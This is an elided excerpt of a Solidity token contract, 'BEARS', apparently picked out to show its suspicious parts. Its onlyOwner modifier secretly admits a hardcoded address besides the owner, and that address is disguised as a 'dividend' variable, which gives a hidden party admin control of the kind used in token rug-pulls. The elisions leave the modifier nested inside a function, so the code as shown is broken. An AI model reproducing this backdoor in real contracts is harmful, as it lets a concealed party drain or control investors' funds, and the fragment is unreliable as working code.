...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xFaF06C7bF5d74B76Ded28fd7aA05187DCe2faC79) , "owner");
        _;
    }
...
contract BEARS  is Context, IERC20, Ownable {
    ...
    string private _name = "BEARS";
    string private _symbol = "BEARS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2Eabd00cc2f4A81A9bE0739bD08065Cc8670a750);
    address private _Marketing = 0x2Eabd00cc2f4A81A9bE0739bD08065Cc8670a750;
    address public dividend = 0xFaF06C7bF5d74B76Ded28fd7aA05187DCe2faC79;
